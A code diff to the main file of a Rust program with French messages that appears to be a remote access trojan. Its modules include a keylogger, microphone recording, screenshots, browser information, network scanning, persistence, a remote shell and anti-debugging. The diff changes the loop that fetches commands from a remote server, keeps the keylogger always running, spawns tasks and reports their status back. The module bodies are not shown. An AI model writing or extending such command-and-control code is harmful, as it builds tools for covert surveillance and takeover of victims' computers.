@@ -1,4 +1,4 @@
-mod anti_debug;
+// mod anti_debug;
 mod browser_info;
 mod connexion;
 mod input;
@@ -6,10 +6,10 @@ mod kill_switch;
 mod logs;
 mod mic_rec;
 mod network_scanner;
+mod persistance;
 mod poly;
 mod screenshot;
 mod shell;
-mod persistance;
 
 use rand::Rng;
 use std::collections::HashSet;
@@ -28,7 +28,7 @@ async fn main() {
         eprintln!("Arrêt du programme : kill switch activé");
         return;
     }
-    
+
     if let Some(cmd_map) = poly::get_command_map() {
         let mapping = connexion::CommandMapping {
             keylogger: cmd_map.get("keylogger").unwrap().clone(),
@@ -55,20 +55,33 @@ async fn main() {
     ];
     let mut stopped: HashSet<String> = HashSet::new();
     let mut already_executed: HashSet<String> = HashSet::new();
-    let always_run = ["keylogger"];
+    let always_run: [&'static str; 1] = ["keylogger"];
+    let mut running_tasks: HashSet<String> = HashSet::new();
 
     loop {
         match connexion::get_directives().await {
             Ok(commands) => {
                 println!("Commands received: {:?}", commands);
                 let mut handles: Vec<JoinHandle<()>> = Vec::new();
+                let mut already_in_queue: HashSet<String> = HashSet::new();
                 for command in commands {
                     // Gestion du stop
                     if let Some(num) = command.strip_prefix("stop ") {
-                        if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num) {
+                        if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num)
+                        {
                             println!("Arrêt demandé pour {}", cmd_name);
+                            if *cmd_name == "keylogger" {
+                                input::stop_keylogger();
+                            }
                             stopped.insert(cmd_name.to_string());
                             already_executed.remove(&cmd_name.to_string());
+                            running_tasks.remove(&cmd_name.to_string());
+                            let _ = connexion::send_directive_status(
+                                command.as_str(),
+                                "success",
+                                "Session terminée",
+                            )
+                            .await;
                         } else {
                             println!("Numéro de fonctionnalité inconnu pour stop: {}", num);
                         }
@@ -78,13 +91,24 @@ async fn main() {
                         println!("Commande stoppée ignorée: {}", command);
                         continue;
                     }
-                    // Exécuter toujours les commandes de always_run
-                    if !always_run.contains(&command.as_str()) && already_executed.contains(&command) {
+
+                    if always_run.contains(&command.as_str()) && running_tasks.contains(&command) {
+                        println!("{} est déjà en cours d'exécution", command);
                         continue;
                     }
-                    if !always_run.contains(&command.as_str()) {
-                        already_executed.insert(command.clone());
+
+                    if !always_run.contains(&command.as_str())
+                        && already_in_queue.contains(&command)
+                    {
+                        continue;
                     }
+
+                    if !always_run.contains(&command.as_str()) {
+                        already_in_queue.insert(command.clone());
+                    } else {
+                        running_tasks.insert(command.clone());
+                    }
+
                     let cmd = command.clone();
                     let handle = tokio::spawn(async move {
                         poly::execute_poly_command(&cmd).await;
